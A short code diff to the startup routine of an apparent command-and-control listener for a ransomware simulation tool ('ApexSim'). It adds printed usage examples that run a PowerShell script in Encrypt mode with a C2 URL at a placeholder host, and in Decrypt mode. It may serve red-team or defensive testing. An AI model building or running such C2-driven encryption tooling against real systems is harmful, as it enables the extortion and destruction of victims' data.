@@ -36,7 +36,11 @@ async def startup():
     os.system('cls' if os.name == 'nt' else 'clear')
     print(SPLASH)
     print(f"[*] C2 Listener: HTTPS/443 | Status: ACTIVE")
-    print(f"[*] Canary Watch: {CANARY_FILE} | Status: MONITORING\n" + "-"*65)
+    print("-" * 65)
+    print("USAGE EXAMPLES:")
+    print("  Encrypt: .\\ApexSim.ps1 -Mode Encrypt -C2Url 'https://YOUR_IP/api/v1/telemetry'")
+    print("  Decrypt: .\\ApexSim.ps1 -Mode Decrypt -TargetPath 'C:\\SimulationData'")
+    print("-" * 65)
     await init_db()
 
 def decrypt_payload(b64_data):
